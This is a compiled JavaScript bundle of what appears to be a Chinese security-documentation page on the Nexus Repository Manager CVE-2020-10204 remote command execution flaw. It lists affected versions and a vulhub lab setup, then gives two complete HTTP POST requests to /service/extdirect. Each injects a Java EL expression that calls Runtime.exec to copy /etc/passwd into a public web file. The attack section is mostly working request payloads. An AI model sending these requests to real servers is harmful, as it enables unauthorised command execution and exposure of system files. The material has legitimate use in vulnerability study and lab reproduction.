{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[306],{1341:function(t,s,a){t.exports=a.p+\"assets/img/image-20210628181754513.f3e4c135.png\"},1342:function(t,s,a){t.exports=a.p+\"assets/img/image-20210628191832105.ada1e77c.png\"},1994:function(t,s,a){\"use strict\";a.r(s);var e=a(56),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"nexus-repository-manger-extdirect-后台远程命令执行-cve-2020-10204\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#nexus-repository-manger-extdirect-后台远程命令执行-cve-2020-10204\"}},[t._v(\"#\")]),t._v(\" Nexus Repository Manger extdirect 后台远程命令执行 CVE-2020-10204\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞描述\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),e(\"p\",[t._v(\"Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞，这个漏洞是CVE-2018-16621的绕过。\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞影响\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[t._v(\"#\")]),t._v(\" 漏洞影响\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"Nexus < 3.21.1\")]),e(\"br\"),t._v(\" \"),e(\"h2\",{attrs:{id:\"环境搭建\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#环境搭建\"}},[t._v(\"#\")]),t._v(\" 环境搭建\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204\")]),e(\"br\"),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞复现\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),e(\"p\",[t._v(\"漏洞触发需要任意账户权限\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1341),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"该漏洞需要访问更新角色或创建角色接口，登录任意用户后修改 \"),e(\"code\",[t._v(\"NXSESSIONID\")])]),t._v(\" \"),e(\"p\",[t._v(\"发送请求包执行命令\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-json extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-json\"}},[e(\"code\",[t._v(\"POST /service/extdirect HTTP/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.1\")]),t._v(\"\\nHost\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" \\naccept\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" application/json\\nUser-Agent\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" Mozilla/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"5.0\")]),t._v(\" (X11; Linux x86_64) AppleWebKit/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"537.36\")]),t._v(\" (KHTML\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),t._v(\" like Gecko) Chrome/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"81.0\")]),t._v(\".\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"4044.138\")]),t._v(\" Safari/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"537.36\")]),t._v(\"\\nNX-ANTI-CSRF-TOKEN\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0.856555763510765\")]),t._v(\"\\nContent-Type\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" application/json\\nCookie\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" jenkins-timestamper-offset=\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"-28800000\")]),t._v(\"; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1583249520\")]),t._v(\"; NX-ANTI-CSRF-TOKEN=\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0.856555763510765\")]),t._v(\"; NXSESSIONID=e9d6620d\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"-6843\")]),t._v(\"-49a6-a887-cd7cef74d413\\nContent-Length\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"304\")]),t._v(\"\\n\\n\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"action\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"coreui_Role\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"method\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"create\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"data\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"version\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"source\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"default\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"id\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"1111\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"name\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"2222\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"description\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"3333\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"privileges\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"\\\"$\\\\\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\\\"\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"roles\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"type\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"rpc\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"tid\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"89\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\")])])]),e(\"p\",[t._v(\"另一处漏洞点\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-json extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-json\"}},[e(\"code\",[t._v(\"POST /service/extdirect HTTP/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.1\")]),t._v(\"\\nHost\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" \\naccept\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" application/json\\nUser-Agent\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" Mozilla/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"5.0\")]),t._v(\" (X11; Linux x86_64) AppleWebKit/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"537.36\")]),t._v(\" (KHTML\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),t._v(\" like Gecko) Chrome/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"81.0\")]),t._v(\".\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"4044.138\")]),t._v(\" Safari/\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"537.36\")]),t._v(\"\\nNX-ANTI-CSRF-TOKEN\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0.856555763510765\")]),t._v(\"\\nContent-Type\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" application/json\\nCookie\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" jenkins-timestamper-offset=\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"-28800000\")]),t._v(\"; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1583249520\")]),t._v(\"; NX-ANTI-CSRF-TOKEN=\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0.856555763510765\")]),t._v(\"; NXSESSIONID=e9d6620d\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"-6843\")]),t._v(\"-49a6-a887-cd7cef74d413\\nContent-Length\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"304\")]),t._v(\"\\n\\n\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"action\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"coreui_User\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"method\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"update\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"data\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"userId\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"www\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"version\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"2\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"firstName\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"www\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"lastName\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"www\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"email\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"www@qq.com\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"status\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"active\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"roles\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"\\\"$\\\\\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\\\"\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"type\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"rpc\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),e(\"span\",{pre:!0,attrs:{class:\"token property\"}},[t._v('\"tid\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"9\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\")])])]),e(\"p\",[t._v(\"访问 vuln.html\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1342),alt:\"img\"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);","extractedComments":[]}